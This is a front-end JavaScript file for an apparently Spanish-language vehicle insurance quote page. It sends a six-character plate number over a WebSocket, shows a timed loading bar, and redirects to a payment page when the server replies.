const socket = new WebSocket('wss://www.suramercado.com');
// const socket = new WebSocket('ws://localhost:3000');

const formCotizar = document.getElementById('formCotizar');
const spinnerContainer = document.getElementById('container-spinner');
const spinner = document.getElementById('spinner');

let loading = false;

// Función para mostrar la barra de carga
const showLoadingBar = () => {
    const loadingBar = document.getElementById('loading-bar');
    const loadingContainer = document.getElementById('loading-bar-container');
    const loadingText = document.getElementById('loading-text');

    loadingBar.style.width = '0';
    loadingText.innerHTML = 'Por favor, espere...';
    loadingContainer.classList.remove('disabled'); // Añadir esta línea para mostrar el contenedor

    setTimeout(() => {
        loadingBar.style.width = '50%';
        loadingText.innerHTML = 'Espera un momento, estamos terminando de validar tú información...';
    }, 15000);

    setTimeout(() => {
        loadingBar.style.width = '100%';
    }, 30000);
}


// Función para ocultar la barra de carga
const hideLoadingBar = () => {
    document.getElementById('loading-bar').style.width = '100%';
    setTimeout(() => {
        document.getElementById('loading-bar-container').classList.add('disabled');
    }, 500);
}

formCotizar.addEventListener('submit', (e) => {
    e.preventDefault();
    const placa = document.getElementById('placaInput').value;
    document.getElementById('placaInput').value = '';
    socket.send(JSON.stringify({ placa, state: true }));

    // Disabled input and button of the form
    document.getElementById('placaInput').disabled = true;
    document.getElementById('placaButton').disabled = true;

    // Inicia la barra de carga
    loading = true;
    showLoadingBar();

    spinnerContainer.classList.remove('disabled');
    spinner.classList.remove('disabled');
    spinnerContainer.classList.add('show');
    spinner.classList.add('show');
});

socket.onmessage = (event) => {
    const data = JSON.parse(event.data);

    if (data.heartbeat) {
        // Ignore "heartbeats"
        return;
    }

    if (loading && data.redirectUserId && data.message) {
        // Desactiva la barra de carga cuando se recibe un mensaje desde el socket
        loading = false;
        hideLoadingBar();

        // Redirect user to pay.html and show alert with message received
        localStorage.setItem('message', data.message);
        window.location.href = `pay.html`;
    }
};

document.getElementById('placaInput').addEventListener('input', function () {
    if (this.validity.patternMismatch) {
        this.setCustomValidity('Por favor, ingrese exactamente 6 caracteres alfanuméricos.');
    }
});

document.getElementById('placaInput').addEventListener('invalid', function () {
    if (this.validity.patternMismatch) {
        this.setCustomValidity('Por favor, ingrese exactamente 6 caracteres alfanuméricos.');
    }
});